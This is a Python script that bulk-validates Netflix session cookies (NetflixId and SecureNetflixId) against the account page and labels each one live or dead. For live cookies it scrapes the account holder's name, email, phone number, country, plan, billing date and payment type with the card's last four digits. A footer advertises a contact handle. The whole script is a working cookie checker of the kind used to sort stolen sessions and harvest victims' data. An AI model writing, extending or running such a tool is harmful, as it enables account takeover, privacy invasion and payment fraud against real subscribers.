import requests
import re
import os
from urllib.parse import unquote
from html import unescape
from time import sleep
from datetime import datetime
from wcwidth import wcswidth
from colorama import Fore, Style, init
init(autoreset=True)
# import warnings

# warnings.filterwarnings("ignore", category=DeprecationWarning)

def decode_response(raw_html):
    html = unescape(raw_html)
    return bytes(html, 'utf-8').decode('raw_unicode_escape', errors='ignore')

def parse_account_info(decoded_html):
    result = {
        "status": "LIVE",
        "plan": "-", "billing": "-", "videoQuality": "-",
        "maxStreams": "-", "paymentType": "-", "last4": "-",
        "displayName": "-", "email": "-", "country": "-",
        "membershipStatus": "-", "isStreaming": "-", "experience": "-",
        "memberSince": "-", "phoneNumber": "-", "phoneNumberVerified": "-"
    }

    # Plan name
    plan_match = re.search(r'"currentPlan":\{"fieldType":"Group","fieldGroup":"MemberPlan","fields":\{"localizedPlanName":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if plan_match:
        result["plan"] = plan_match.group(1)

    # Next payment
    billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if billing_match:
        result["billing"] = bytes(billing_match.group(1), 'utf-8').decode('unicode_escape')

    # Member since "memberSince":"2018-06-07T23:14:56.000Z",
    member_since_match = re.search(r'"memberSince"\s*:\s*"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z)"', decoded_html)
    if member_since_match:
        iso_date_str = member_since_match.group(1)
        dt = datetime.strptime(iso_date_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        formatted_date = f"{dt.day} {dt.strftime('%B %Y')}"
        result["memberSince"] = formatted_date

    # Phone number
    phone_number_match = re.search(r'"growthPhoneNumber"\s*:\s*\{[^}]*"isVerified"\s*:\s*(true|false|null),\s*"phoneNumberDigits"\s*:\s*(null|\{[^}]*"value"\s*:\s*"([^"]*)"\})', decoded_html)
    if phone_number_match:
        is_verified_str = phone_number_match.group(1)           # 'true', 'false', or 'null'
        phone_number_block = phone_number_match.group(2)        # entire block or 'null'
        phone_number_value = phone_number_match.group(3)        # the actual phone number string or None

        if phone_number_block == 'null' or phone_number_value is None:
            result["phoneNumber"] = "No Phone Number"
            result["phoneNumberVerified"] = False
        else:
            phone_number_decoded = bytes(phone_number_value, 'utf-8').decode('unicode_escape')
            result["phoneNumber"] = phone_number_decoded
            result["phoneNumberVerified"] = is_verified_str == 'true'
    else:
        result["phoneNumber"] = "NOT FOUND"
        result["phoneNumberVerified"] = False

    # Video quality
    quality = re.search(r'"videoQuality":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if quality:
        result["videoQuality"] = quality.group(1)

    # Max streams
    stream = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', decoded_html)
    if stream:
        result["maxStreams"] = stream.group(1)

    # Payment type
    pay_type = re.search(r'"type":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if pay_type:
        result["paymentType"] = pay_type.group(1)

    last4 = re.search(r'"displayText":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if last4:
        result["last4"] = last4.group(1)

    # Profile info
    acc_info = re.search(r'"accountInfo":\{"data":\{(.*?)\}\s*,\s*"type":"api"\}', decoded_html, re.DOTALL)
    if acc_info:
        block = acc_info.group(1)
        name = re.search(r'"displayName":"(.*?)"', block)
        if name:
            result["displayName"] = bytes(name.group(1), "utf-8").decode("unicode_escape")
        email = re.search(r'"emailAddress":"(.*?)"', block)
        if email:
            result["email"] = bytes(email.group(1), "utf-8").decode("unicode_escape")
        country = re.search(r'"country":"(.*?)"', block)
        if country:
            result["country"] = country.group(1)
        status = re.search(r'"membershipStatus":"(.*?)"', block)
        if status:
            result["membershipStatus"] = status.group(1)
        stream = re.search(r'"isStreaming":(true|false)', block)

    return result

def check_cookie(netflix_id, secure_id=None):
    url = "https://www.netflix.com/account"
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    cookies = {"NetflixId": netflix_id}
    if secure_id:
        cookies["SecureNetflixId"] = secure_id

    try:
        r = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False)
        if r.status_code in [301, 302] and "login" in r.headers.get("Location", ""):
            return {"status": "DEAD"}
        decoded = decode_response(r.text)
        return parse_account_info(decoded)
    except Exception as e:
        return {"status": "ERROR", "error": str(e)}

def print_live_account(i, info):
    lines = [
        f"{'Name'         :<14}: {info['displayName']}",
        f"{'Email'        :<14}: {info['email']}",
        f"{'Phone Number' :<14}: {info['phoneNumber']} {'| ✅ Verified' if info['phoneNumberVerified'] else '| ❌ Not Verified' if info['phoneNumber'] != 'No Phone Number' else ''}",
        f"{'Country'      :<14}: {info['country']}",
        f"{'Plan'         :<14}: {info['plan']} ({info['videoQuality']})",
        f"{'Max Streams'  :<14}: {info['maxStreams']}",
        f"{'Member Since' :<14}: {info['memberSince']}",
        f"{'Next Payment' :<14}: {info['billing']}",
        f"{'Payment'      :<14}: {info['paymentType']} {info['last4']}"
    ]

    content_width = max(wcswidth(line) for line in lines)
    box_width = content_width + 4

    print(Fore.GREEN + "╔" + "═" * (box_width - 2) + "╗")

    header_text_raw = f"STATUS ACCOUNT | 🟢 LIVE [{i}]"
    padding_header = (box_width - 2 - wcswidth(header_text_raw)) // 2
    print(Fore.GREEN + "║" + Style.RESET_ALL + " " * padding_header + header_text_raw + " " * (box_width - 2 - wcswidth(header_text_raw) - padding_header) + Fore.GREEN + "║")

    print(Fore.GREEN + "╠" + "═" * (box_width - 2) + "╣")

    for line in lines:
        line_padding = box_width - 4 - wcswidth(line)
        print(Fore.GREEN + "║" + Style.RESET_ALL + " " + line + " " * line_padding + " " + Fore.GREEN + "║")

    print(Fore.GREEN + "╠" + "═" * (box_width - 2) + "╣")

    footer_text_raw = f"Contact @govtrashit"
    padding_footer = (box_width - 2 - wcswidth(footer_text_raw)) // 2
    print(Fore.GREEN + "║" + Style.RESET_ALL + " " * padding_footer + footer_text_raw + " " * (box_width - 2 - wcswidth(footer_text_raw) - padding_footer) + Fore.GREEN + "║")

    print(Fore.GREEN + "╚" + "═" * (box_width - 2) + "╝" + Style.RESET_ALL)

def print_dead_account(i):
    print(f"{Fore.RED}❌ [{i}] DEAD COOKIE{Style.RESET_ALL}")

def print_error_account(i, error):
    print(f"{Fore.YELLOW}⚠️  [{i}] ERROR: {error}{Style.RESET_ALL}")

def process_accounts(account_lines):
    for i, line in enumerate(account_lines, 1):
        parts = line.split("|")
        netflix_id = unquote(parts[0])
        secure_id = unquote(parts[1]) if len(parts) > 1 else None

        info = check_cookie(netflix_id, secure_id)

        if info["status"] == "LIVE":
            print_live_account(i, info)
        elif info["status"] == "DEAD":
            print_dead_account(i)
        else:
            print_error_account(i, info.get('error', 'Unknown error'))

        sleep(1)

if __name__ == "__main__":
    while True:
        print(f"\n{Fore.CYAN}Choose mode:{Style.RESET_ALL}")
        print(f"1. {Fore.GREEN}Single check from manual input{Style.RESET_ALL}")
        print(f"2. {Fore.YELLOW}Bulk check from .txt file{Style.RESET_ALL}")
        print(f"3. {Fore.RED}Exit{Style.RESET_ALL}")

        choice = input(f"{Fore.BLUE}Enter your choice (1/2/3): {Style.RESET_ALL}")

        if choice == '1':
            print(f"\n{Fore.GREEN}--- Manual Checker ---{Style.RESET_ALL}")
            cookie_input = input(f"{Fore.YELLOW}Input NetflixId: {Style.RESET_ALL}")
            if not cookie_input:
                print(f"{Fore.RED}Input cannot be empty.{Style.RESET_ALL}")
                continue
            process_accounts([cookie_input])
        elif choice == '2':
            print(f"\n{Fore.YELLOW}--- Bulk Checker ---{Style.RESET_ALL}")
            file_name = input(f"{Fore.BLUE}Input file name .txt (example: cek.txt): {Style.RESET_ALL}")
            if not file_name.endswith(".txt"):
                file_name += ".txt"

            if not os.path.exists(file_name):
                print(f"{Fore.RED}File '{file_name}' not found.{Style.RESET_ALL}")
                continue

            try:
                with open(file_name, "r") as f:
                    lines = [line.strip() for line in f if line.strip()]
                if not lines:
                    print(f"{Fore.YELLOW}File '{file_name}' empty.{Style.RESET_ALL}")
                    continue
                process_accounts(lines)
            except Exception as e:
                print(f"{Fore.RED}An error occurred while reading the file: {e}{Style.RESET_ALL}")
        elif choice == '3':
            print(f"{Fore.MAGENTA}Thank you for using this script! See you soon.{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}Invalid selection. Please try again.{Style.RESET_ALL}")